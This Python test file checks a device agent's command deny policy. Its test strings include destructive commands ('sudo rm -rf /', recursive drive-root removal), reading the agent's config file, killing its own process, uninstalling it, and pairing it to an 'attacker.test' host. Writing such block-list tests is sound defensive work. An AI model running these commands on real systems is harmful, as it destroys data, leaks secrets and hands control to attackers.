from hermeshands_device import policy
from hermeshands_device.protocol import policy_hash


def test_policy_refusal_names_pattern_and_126(capsys):
    result = policy.check("sudo rm -rf /")
    output = capsys.readouterr().out
    assert result == 126
    assert "sudo" in output


def test_policy_digest_and_reset(tmp_path, monkeypatch):
    monkeypatch.setattr("hermeshands_device.config.ROOT", tmp_path)
    monkeypatch.setattr("hermeshands_device.config.POLICY_PATH", tmp_path / "policy.json")
    first = policy.reset()
    assert first == policy.digest()
    assert policy.refusal("shutdown now")


def test_policy_blocks_terminating_its_own_pid():
    import os

    assert policy.refusal(f"taskkill /PID {os.getpid()}")


def test_policy_blocks_drive_root_removal():
    assert policy.refusal("Remove-Item C:\\ -Recurse -Force")


def test_policy_allows_repo_paths_and_server_pidfile():
    assert policy.refusal("builtin cd -- '/c/Users/me/hermes-hands' || exit 126") is None
    assert policy.refusal("kill -9 $(cat server.pid)") is None
    assert policy.refusal('kill -0 "$(cat /tmp/hermes_bg_proc-1.pid 2>/dev/null)" 2>/dev/null; echo $?') is None


def test_policy_blocks_sensitive_commands_after_quote_normalization(monkeypatch):
    monkeypatch.setattr(policy.os, "getpid", lambda: 4321)
    for script in (
        'hermes-hands unpair',
        'hermes""-hands unpair',
        'su""do id',
        'pipx uninstall hermes-hands',
        'rm -rf ~/.hermes-hands',
        'cat ~/.hermes-hands/config.json',
        'kill $PPID',
        'kill -9 4321',
        'Hermes"Hands"',
    ):
        assert policy.refusal(script), script


def test_policy_blocks_hermes_cli_commands_from_jobs():
    for script in (
        "hermes-hands pair https://attacker.test --name x --code y",
        "hermes-hands.exe unpair",
        "hermes-hands install-service --remove",
        "hermes-hands policy reset",
        "hermes-hands serve",
        "uv tool uninstall hermes-hands",
        "pipx uninstall hermes-hands",
        "python -m pip uninstall hermes-hands",
        "taskkill //F //IM hermes-hands.exe",
        "schtasks //Delete //TN HermesHands //F",
    ):
        assert policy.refusal(script), script


def test_policy_does_not_normalize_json_or_refuse_home_subpaths():
    assert policy.refusal("curl https://localhost -d '{\"model\": \"llama3\", \"format\": \"json\", \"prompt\": \"hi\"}'") is None
    assert policy.refusal("python -c \"json.dumps({'format': 'x', 'b': 2})\"") is None
    assert policy.refusal("rm -rf ~/projects/app/node_modules") is None
    assert policy.refusal("rm -rf ~/.cache/pip") is None
    assert policy.refusal("rm -rf ~")
    assert policy.refusal('rm -rf "$HOME"')


def test_policy_uses_digit_boundaries_for_agent_pid(monkeypatch):
    monkeypatch.setattr(policy.os, "getpid", lambda: 21900)
    assert policy.refusal("kill -TERM 121900") is None
    assert policy.refusal("kill -TERM 21900")


def test_policy_snapshot_hashes_and_parses_one_read(tmp_path, monkeypatch):
    raw = b'{"deny":["shutdown"]}'
    path = tmp_path / "policy.json"
    path.write_bytes(raw)
    monkeypatch.setattr("hermeshands_device.config.POLICY_PATH", path)
    original_read_bytes = path.read_bytes
    reads = []

    def read_bytes():
        reads.append(True)
        return original_read_bytes()

    monkeypatch.setattr(type(path), "read_bytes", lambda self: read_bytes() if self == path else original_read_bytes())
    digest, deny = policy.snapshot()
    assert digest == policy_hash(raw)
    assert deny == ["shutdown"]
    assert reads == [True]
